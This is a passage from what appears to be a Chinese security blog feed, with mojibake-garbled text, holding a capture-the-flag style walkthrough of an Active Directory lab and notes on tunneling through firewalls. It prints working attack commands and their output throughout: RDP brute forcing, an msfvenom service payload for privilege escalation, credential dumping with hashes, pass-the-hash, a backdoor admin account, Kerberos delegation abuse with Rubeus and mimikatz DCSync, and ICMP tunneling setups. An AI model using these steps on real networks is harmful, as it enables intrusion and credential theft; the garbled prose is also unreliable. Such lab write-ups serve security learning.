‡é¢˜</span><br><span class="line"> Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.4.36        code:200 len:68100  title:ä¸­æ–‡ç½‘é¡µæ ‡é¢˜</span><br></pre></td></tr></table></figure><p>flag1é‡Œé¢ç»™äº†æç¤ºwin19ï¼Œä»4.45å…¥æ‰‹ï¼Œè¿˜æåˆ°äº†rockyouï¼Œè¿™é‡Œä¸éš¾çŒœå‡ºæ˜¯çˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.4.45  -p 1-65535 </span><br></pre></td></tr></table></figure><p>æ‰«ä¸€ä¸‹ç«¯å£å…ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741313381837-944267d4-d87b-4393-a3eb-55c8045222f7.png"></p><p>æ­ä¸ªä»£ç†çˆ†ç ´3389</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -l win19\Adrian -P /usr/share/wordlists/rockyou.txt 172.22.4.45 rdp</span><br><span class="line"></span><br><span class="line">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741314533445-6357f1ba-f0f5-427f-b953-d2ca1d1b1883.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win19\Adrian babygirl1</span><br></pre></td></tr></table></figure><p>è¿œç¨‹å‘ç°ä¸è¡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741314636812-e2f25fde-7816-4d6a-9d4f-6e440827bd78.png"></p><p>çœ‹äº†åšå®¢çŸ¥é“ä½¿ç”¨ç”¨kaliè¿œç¨‹è¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741314777084-95b9da34-1584-461c-abdd-258e6d4b0a47.png"></p><p>ä¿®æ”¹å®Œå¯†ç å†ç”¨parallels clientè¿ä¸Šå»</p><h2 id="æ³¨å†Œè¡¨ææƒ"><a href="#æ³¨å†Œè¡¨ææƒ" class="headerlink" title="æ³¨å†Œè¡¨ææƒ"></a>æ³¨å†Œè¡¨ææƒ</h2><p>å‘ç°æ¡Œé¢æœ‰ä¸€ä¸ªæ‰«æç»“æœï¼Œå¯ä»¥çœ‹åˆ°æ³¨å†Œè¡¨ææƒ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741314961049-b8bc651f-84e8-419c-ae46-5762d5988f56.png"></p><p>msfç”Ÿæˆæœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\sam.bat &#x27; --platform windows -f exe-service &gt; a.exe</span><br></pre></td></tr></table></figure><p>å†å†™ä¸€ä¸ªsam.batï¼Œä¹‹åä¸Šä¼ åˆ°winæœºå™¨ä¸Šã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure><p>winæœºå™¨ä¸Špowershellæ‰§è¡Œï¼Œä¿®æ”¹æ³¨å†Œè¡¨æœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\Users\Adrian\Desktop\a.exe&quot; /f</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741315957968-92fad909-3e98-4477-9c1d-c754be550afb.png"></p><p>cmdä¸­å†è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><p>æ¡Œé¢ä¼šç”Ÿæˆä¸‰ä¸ªæ–‡ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741423594963-59290fa2-25d7-4530-b474-1769133a82b7.png"></p><p>ä¼ åˆ°kailié‡Œé¢è§£å¯†ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/baji]</span><br><span class="line">â””â”€# impacket-secretsdump LOCAL -sam sam -security security -system system    </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x08092415ee8b9b2ad2f5f5060fb48339</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br><span class="line">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:94291812c16338307ad6e39f69438dc1:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">XIAORANG.LAB/Aldrich:$DCC2$10240#Aldrich#e4170181a8bb2a24e6113a9b4895307a: (2022-06-24 03:18:39)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC </span><br><span class="line">$MACHINE.ACC:plain_password_hex:b4ed1b0e56b94c3200d14254d8b93c209751282f4f1fdc22f08b2445f88e7c9416640ec7be39a3a96542b57908b5425271ca84d4514e3452b9df96f9b53141b14f90632af381b68dcd2f5053cae57a2e50c9e04a4eb2e6dd3b707bb593b80096912294cc5d07eb6f5e6d918024f58aa48a169f48079d6a5eedb27d8de7a96da3647ab984d24d87f34c6ec275c33122e6971ae0028cf0402afcf9c6e5b566c5bd182eb970d4476b97d49c09bfb97d297e6cec7a40c74aae874ad9f51477ca6a50c746dfd75046340b067eb5bc44d691ed47995b10d319ee7a8261e99f3375775f8b36615e337f2020e22c7c72da7ad831</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:163bc37b84732d4ceeb4840fdaaf2271</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x4af114bade59102b7c64e41cde94be2257337fab</span><br><span class="line">dpapi_userkey:0x372392e560b616ecd27b6ec0fe138ef86790b565</span><br><span class="line">[*] NL$KM </span><br><span class="line"> 0000   56 4B 21 B3 87 A3 29 41  FD 91 8F 3A 2D 2B 86 CC   VK!...)A...:-+..</span><br><span class="line"> 0010   49 4A EE 48 6C CD 9C D7  C7 DA 65 B6 62 4D 35 BD   IJ.Hl.....e.bM5.</span><br><span class="line"> 0020   09 F7 59 68 23 69 DE BA  2D 47 84 47 29 AD 5D AE   ..Yh#i..-G.G).].</span><br><span class="line"> 0030   A0 5F 19 CA 21 13 E4 6D  01 27 C3 FC 0C C1 0F 2E   ._..!..m.&#x27;......</span><br><span class="line">NL$KM:564b21b387a32941fd918f3a2d2b86cc494aee486ccd9cd7c7da65b6624d35bd09f759682369deba2d47844729ad5daea05f19ca2113e46d0127c3fc0cc10f2e</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°adminçš„hashï¼Œæ‰“pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py administrator@172.22.4.45 -hashes &quot;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&quot; -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741424229497-4abc6bf3-c0a5-4414-b6ce-7c01bdfc0f1f.png"></p><p>flag{92727123-810e-4309-a004-9e547651f41d}</p><p>æ·»åŠ åé—¨ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user calmsec qwer1234! /add</span><br><span class="line">net localgroup administrators calmsec /add</span><br></pre></td></tr></table></figure><h2 id="éçº¦æŸå§”æ´¾"><a href="#éçº¦æŸå§”æ´¾" class="headerlink" title="éçº¦æŸå§”æ´¾"></a>éçº¦æŸå§”æ´¾</h2><p>ç”¨æœºå™¨è´¦æˆ·è·‘ä¸€ä¸‹bloodhoundï¼Œå“ˆå¸Œæ˜¯$MACHINE.ACCçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u win19$ --hashes &quot;aad3b435b51404eeaad3b435b51404ee:163bc37b84732d4ceeb4840fdaaf2271&quot; -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430087821-932054f7-8235-49e8-bc62-80dacdb22689.png"></p><p>å‘ç°win19å’Œdc01éçº¦æŸå§”æ´¾</p><p>ç”¨æ–°åˆ›çš„adminè´¦å·ç™»å½•winï¼Œç„¶åç”¨ç®¡ç†å‘˜æƒé™è¿è¡ŒRubeus:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure><p>å†åˆ©ç”¨dfscoerceæ¼æ´ï¼Œä½¿åŸŸæ§å¼ºåˆ¶è®¿é—®è¿›è€Œè·å¾—åŸŸæ§çš„ç¥¨æ®</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430264742-cad0df5c-58cf-4084-8749-f64690f36a87.png"></h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430278566-e340b2d1-ee54-4689-a76a-190f71dd2616.png"></p><p>æ‹¿åˆ°dc01ç¥¨æ®ï¼Œbase64è§£å¯†ä¿å­˜ä¸ºDC01.kirbi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6K4Z3eNF+A8DAgQepsmPQ85lKX2xX79uHXzSrfCVoF0b0b2aM/TMfQBxHCdm9mtKcO156qmyoRj1m6qzKFm5X7qq6hktTGxZ6jYjNMpaHTeSLzvXpUOwmUGdvXVWo0nXDE3orH9wNh/xS83Dl6pUotbMZpEL/ulBn3BdPBbFrjFazCqkz1BVoUUcL6w9SO3KoMbe5+Lnl5rL7dJXwr8u1AkzBo1U3Co0T53hCYl4CJbptLGbJ1kXzxmJbS2isdheMIDBbxWqEO4E30XopEEgAxVlmka5fppXFnFKl2adzJj5mbbRK3ChrRa1ON4VETLlj8itybFfOoCtnIEC1ZKKktCy8TKwjFUP7dSod7a73an5BgPAKqC3ueN9EEyyRTsKt8u7K/Zi8xPa1vlAx1uryH9dXeXAoCA7RNdVIPAtpQf0bNkzVL9H8tf0eLaZbEZZWAkQrk1tCuYkYhdMZTW1C1b+N4Wf4SH4A98hxKbBMhWgtg3oR/wQHFHZIW4JgiX2/mn1I1BmMZQGvHeQWEju376owrAYtAS5zHBeUktNsYEUiBuhek8SfiFcKE21Rcv3kG6iku+5l2MH+DohrdVLRVp6jWrrN9YJq/9wQlkYgczjfMIetnxyOsbmYb53lberPcZCFkYkZr72m9yUdnKYoXTG7pBgzWYJ9yTewO0/TKT6cC70CwJwNF+c7l1YocdrcHFVXw+RAwSzj7pgj0iLiKwILTEjoNqVjDEVPSMXeAMo5HkoDd9S1nXoXAbs7Dhr0HKoPbhj23g/1CJrWC7TlQBSw6QGjjZ7+F3XykQZiXdGU5wzYi4sGhvEBkpyGC5iZZEhVNc2YZZZnTdkSZ2MOaAeXa0bZda21dl0c+gpAxxhp/YAE6qoL/6nncn0ItHwTYexT6x+UY6Gq2Zavm0TzFkrQ3t7979PvdOCz9BsPICX7TQJYFKi7FVWh8En9suaZdnnoGtf61sKvsnGkJoiwH3VPKPb6WbGslicWhA2JAL7U8aFNXYgQcgA6mSeb8PzJ04Y9vSrSoBeYk1F/h2ZE81rppiVBWmnuS72CQ0zPfac3fWbhdBTld6Nt9Nsgqz9W/48H80kEdnlqIDf71gCb+rHeKOrxkpny45sKUd3CHiuYPhTsZvxpivLlNGIqoV+SqJNt9VfNZNXANCmr4Hpy0/11NgAK8c6gi9+MeAzg7GHK0HRXmEsYoG925aPSwrlfZZEIjR0NozP47j7XMLKgP1Lu6tSSu9B64AjTGIh8enKB/hoSKvEVie0nOERMyHKQnW7M673hHBTw2apBFlKPHxofkYq6RmRb3sOPAiqAmj0EQuaq1fupYU6iYd8LzAecGgsUZR2iwlGxRt9RtQKyiSXu0OGv9fOR5Lo3279xwOXFxoIfFaI2RNwbl55TtR6iaYV/6P87Jxkf2FtOYabi1F9nhexHm4JFfO1MShQOjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCnM4CFnR8TYY5kjGPQWZbZa3P/3xCg2/q6c+qsbVTlsqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDMwODA4NDIwMlqmERgPMjAyNTAzMDgxODQyMDJapxEYDzIwMjUwMzE1MDg0MjAyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==&#x27; | base64 -d &gt; DC01.kirbi</span><br></pre></td></tr></table></figure><p>ä¼ çŒ•çŒ´æ¡ƒï¼Œæ‰“DCSyncè·å–åŸŸæ§hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC01.kirbi&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /user:administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430716353-9b8993e2-df78-4a2e-889c-f349c45b99f8.png">æ‹¿åˆ°dc01åŸŸæ§ï¼Œå†æ¨ªå‘ä¸€ä¸‹4.19</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3  psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/Administrator@172.22.4.19</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430816098-c954d7fe-894a-43c3-a1b9-1d13cc82cb70.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430940264-828476af-2d72-4395-b1c9-b7d8a9b7f019.png"></p><p>æ ¹æ®æç¤ºå†æ‰“ä¸‹ä¸€å°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 Administrator@172.22.4.7 </span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741431120961-3d5f24b9-ea12-4bdd-9569-a0fd104a4503.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é˜²ç«å¢™å¼€å¯çŠ¶æ€ä¸‹éš§é“æ­å»º(äºŒ)</title>
      <link href="/2025/01/06/%E5%9F%9F/%E9%9A%A7%E9%81%932/"/>
      <url>/2025/01/06/%E5%9F%9F/%E9%9A%A7%E9%81%932/</url>
      
        <content type="html"><![CDATA[<h3 id="SMB-å¼€é˜²ç«å¢™å…¥ç«™åª445ï¼š"><a href="#SMB-å¼€é˜²ç«å¢™å…¥ç«™åª445ï¼š" class="headerlink" title="SMB-å¼€é˜²ç«å¢™å…¥ç«™åª445ï¼š"></a>SMB-å¼€é˜²ç«å¢™å…¥ç«™åª445ï¼š</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553835240-a5f1ea2b-e79f-4bfa-aa33-fa8d6b6b0866.png"></p><p>å¯ç”¨äºæ–‡ä»¶æ‰“å°å’Œå…±äº«</p><p>smbå’Œä¸Šé¢ä¸¤ä¸ªicmpå’Œdnsä¸ä¸€æ ·ï¼Œä»–æ˜¯ä¸ºäº†è§£å†³å…¥ç«™é—®é¢˜</p><p>SMBä¸€èˆ¬åœ¨é˜²ç«å¢™å…¥ç«™é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œåˆ¤æ–­ç›®æ ‡ç«¯å£æ˜¯å¦å¼€æ”¾</p><p>é€‚ç”¨åœºæ™¯ï¼šé˜²ç«å¢™æ”¾è¡Œçš„å…¥å£æ‰“ä¸ä¸‹åˆ©ç”¨æ”¾è¡Œçš„SMBç§»åŠ¨è·å–æƒé™</p><p>åˆ©ç”¨æ¡ä»¶ï¼šå¯†ç å–·å°„æˆ–å·²çŸ¥å£ä»¤çš„æƒ…å†µä¸‹ç›´æ¥æ­£å‘SMBæ¨ªå‘ç§»åŠ¨æ‹¿ä¸‹</p><p>å¤§è‡´æµç¨‹ï¼š</p><p>åŸŸæ§192.168.3.21</p><p>webæœåŠ¡å™¨ip192.168.3.31</p><p>sqlæœåŠ¡å™¨ip 192.168.3.33</p><p>webæœåŠ¡å™¨å¼€æ”¾445ç«¯å£ï¼ŒwebæœåŠ¡å™¨æ‹¿åˆ°shellä¹‹åï¼Œä¸Šä¼ smbéš§é“æœ¨é©¬ï¼Œc2ä¸Šçº¿ï¼Œms14-058ææƒä»webadminåˆ°systemï¼Œå†csè·å–å¯†ç å‡­è¯ï¼Œå†æ–°å»ºwebåå‘ç›‘å¬åœ°å€192.168.3.31ç«¯å£ä¸º6666 ,å†æ¨ªå‘åˆ°3.33ï¼ŒwebæœåŠ¡å™¨ä¸­è½¬ä»£ç†å½“ä½œè·³æ¿æœº</p><h3 id="1ã€2åœºæ™¯åç»­ç©¿é€é—®é¢˜"><a href="#1ã€2åœºæ™¯åç»­ç©¿é€é—®é¢˜" class="headerlink" title="1ã€2åœºæ™¯åç»­ç©¿é€é—®é¢˜"></a>1ã€2åœºæ™¯åç»­ç©¿é€é—®é¢˜</h3><p>1ã€Pingtunelé…åˆioxä»£ç†Sockså†…ç½‘ç©¿é€</p><p>2ã€dnscat2ï¼ˆDNSï¼‰é…åˆä¸Šçº¿</p><p>C2:</p><p>æ¥æ”¶å®¢æˆ·ç«¯ä¼ é€’çš„ICMP</p><p>.&#x2F;pingtunnel -type server -noprint 1 -nolog 1 -key 000000</p><p>å°†æœ¬åœ°4455è½¬è‡³5566ç«¯å£</p><p>.&#x2F;iox proxy -l 4455 -l 5566</p><p>Web</p><p>å°†æœ¬åœ°2222çš„TCPå°è£…IMCPç»™192.168.139.141:4455</p><p>pingtunnel -type client -l 127.0.0.1:2222 -s 192.168.139.141 -t 192.168.139.141:4455 -tcp 1 -noprint 1 -nolog 1 -key 000000</p><p>å»ºç«‹SockSèŠ‚ç‚¹ç»‘å®š2222ç«¯å£ï¼š</p><p>iox.exe proxy -r 127.0.0.1:2222</p><p>æ­¤æ—¶åœ¨windowsä¸Šproxifierå¯ä»¥åŠ è½½èŠ‚ç‚¹é…ç½®å°±å¯ä»¥è®¿é—®webæœåŠ¡</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
            <tag> éš§é“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é˜²ç«å¢™å¼€å¯çŠ¶æ€ä¸‹éš§é“æ­å»º(ä¸€)</title>
      <link href="/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/"/>
      <url>/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553825369-dde60bfd-547d-4214-b6c5-66c55ee412b3.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553806868-d105683c-fb38-4fcc-800b-93d5c49955d9.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553800329-a703c438-8212-412a-ac8d-a091cc73da41.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553790285-d85f3421-6255-46a4-93e1-c6f5dc7d64db.png"></p><p>sshåªèƒ½ä¿¡æ¯æœé›†ï¼Œicmpå¯ä»¥ä¸Šçº¿c2ï¼Œudpã€tcpä¸»è¦æ˜¯ç”¨è½¬å‘æ•°æ®</p><h3 id="é˜²ç«å¢™ç­–ç•¥-å…¥ç«™è§„åˆ™-å‡ºç«™è§„åˆ™-è‡ªå®šä¹‰"><a href="#é˜²ç«å¢™ç­–ç•¥-å…¥ç«™è§„åˆ™-å‡ºç«™è§„åˆ™-è‡ªå®šä¹‰" class="headerlink" title="é˜²ç«å¢™ç­–ç•¥-å…¥ç«™è§„åˆ™&amp;å‡ºç«™è§„åˆ™&amp;è‡ªå®šä¹‰"></a>é˜²ç«å¢™ç­–ç•¥-å…¥ç«™è§„åˆ™&amp;å‡ºç«™è§„åˆ™&amp;è‡ªå®šä¹‰</h3><p>1ã€é˜²ç«å¢™é»˜è®¤å…¥ç«™&amp;å‡ºç«™ç­–ç•¥</p><p>2ã€é˜²ç«å¢™è‡ªå®šä¹‰å…¥ç«™&amp;å‡ºç«™ç­–ç•¥</p><p>å†…ç½‘åŸŸé˜²ç«å¢™åŒæ­¥ç­–ç•¥ï¼š</p><p>æ“ä½œï¼šç»„ç­–ç•¥ç®¡ç†-åŸŸ-åˆ›å»ºGPOé“¾æ¥-é˜²ç«å¢™è®¾ç½®</p><p>æ›´æ–°ç­–ç•¥ï¼šå¼ºåˆ¶&amp;å‘½ä»¤&amp;é‡å¯</p><p>å‘½ä»¤ï¼šgpupdate&#x2F;force</p><p>é™åˆ¶ç«¯å£åˆ†ä¸ºï¼šå…¥ç«™é™åˆ¶ç«¯å£ã€å‡ºç«™é™åˆ¶ç«¯å£ã€å‡ºå…¥ç«™å‡é™åˆ¶ç«¯å£ã€‚</p><p>å…¥ç«™é™åˆ¶ç«¯å£ï¼Œå‡ºç«™æœªé™åˆ¶ç«¯å£ï¼Œä½¿ç”¨åå‘è¿æ¥ã€‚</p><p>å‡ºç«™é™åˆ¶ç«¯å£ï¼Œå…¥ç«™æœªé™åˆ¶ç«¯å£ï¼Œä½¿ç”¨æ­£å‘è¿æ¥ã€‚</p><p>å‡ºå…¥ç«™å‡é™åˆ¶ç«¯å£ï¼Œä½¿ç”¨ç«¯å£ç»•è¿‡è¿›è¡Œè¿æ¥ï¼Œå»ºè®®é…åˆåå‘è¿æ¥ã€‚</p><p>é™åˆ¶åè®®åˆ†ä¸ºï¼š</p><p>å…¥ç«™é™åˆ¶ã€å‡ºç«™é™åˆ¶ã€å‡ºå…¥å‡é™åˆ¶ï¼Œé™åˆ¶åˆåˆ†ä¸ºï¼šå•åè®®é™åˆ¶ã€å¤šåè®®é™åˆ¶ã€å…¨éƒ¨é™åˆ¶ã€‚</p><p>å…¥ç«™é™åˆ¶ï¼š</p><p>å•åè®®é™åˆ¶ï¼Œä½¿ç”¨å…¶å®ƒåè®®æˆ–è€…åå‘è¿æ¥ç»•è¿‡ã€‚ï¼ˆéš§é“æŠ€æœ¯ï¼‰</p><p>å¤šåè®®é™åˆ¶ï¼Œä½¿ç”¨æœªè¢«é™åˆ¶çš„åè®®æˆ–è€…åå‘è¿æ¥ç»•è¿‡ã€‚ï¼ˆéš§é“æŠ€æœ¯ï¼‰</p><p>å…¨éƒ¨åè®®é™åˆ¶ï¼Œä½¿ç”¨æ”¾å¼ƒæˆ–è€…åå‘è¿æ¥ç»•è¿‡ï¼Œä½†æ­£å¸¸ä¸ä¼šå°†æ‰€ä»¥åè®®éƒ½å°é—­çš„ã€‚</p><p>å‡ºç«™é™åˆ¶ï¼š</p><p>å‚è€ƒä¸Šé¢ä½¿ç”¨æ­£å‘è¿æ¥ç»•è¿‡ã€‚</p><p>å‡ºå…¥å‡é™åˆ¶ï¼š</p><p>å•åè®®é™åˆ¶ï¼Œä½¿ç”¨å…¶å®ƒåè®®ç»•è¿‡ã€‚ï¼ˆéš§é“æŠ€æœ¯ï¼‰</p><p>å¤šåè®®é™åˆ¶ï¼Œä½¿ç”¨æœªè¢«é™åˆ¶çš„åè®®ç»•è¿‡ã€‚ï¼ˆéš§é“æŠ€æœ¯ï¼‰</p><p>å…¨éƒ¨åè®®é™åˆ¶ï¼Œä½¿ç”¨æ”¾å¼ƒç»•è¿‡ï¼Œä½†æ­£å¸¸ä¸ä¼šå°†æ‰€ä»¥åè®®éƒ½å°é—­çš„ã€‚</p><p>å•å±‚ç›®æ ‡æœºé˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š</p><p>1ã€å‘½ä»¤å…³é—­é˜²ç«å¢™</p><p>2ã€åå‘ä¸­è½¬è¿æ¥ä¸Šçº¿</p><p>3ã€åˆ©ç”¨éš§é“æŠ€æœ¯ä¸Šçº¿ï¼ˆè§„åˆ™å†³å®šï¼‰</p><p>å•å±‚è·³æ¿æœºé˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š</p><p>1ã€å‘½ä»¤å…³é—­é˜²ç«å¢™</p><p>2ã€æ­£å‘ç›‘å¬è¿æ¥ä¸Šçº¿</p><p>3ã€åˆ©ç”¨éš§é“æŠ€æœ¯ä¸Šçº¿ï¼ˆè§„åˆ™å†³å®šï¼‰</p><p>åŒå±‚é˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š</p><p>1ã€å‘½ä»¤å…³é—­é˜²ç«å¢™</p><p>2ã€åˆ©ç”¨éš§é“æŠ€æœ¯ä¸Šçº¿ï¼ˆè§„åˆ™å†³å®šï¼‰</p><p>é˜²ç«å¢™å®éªŒï¼ˆé€‚ç”¨åœºæ™¯ï¼‰ï¼š</p><p>1ã€å†…ç½‘æ— 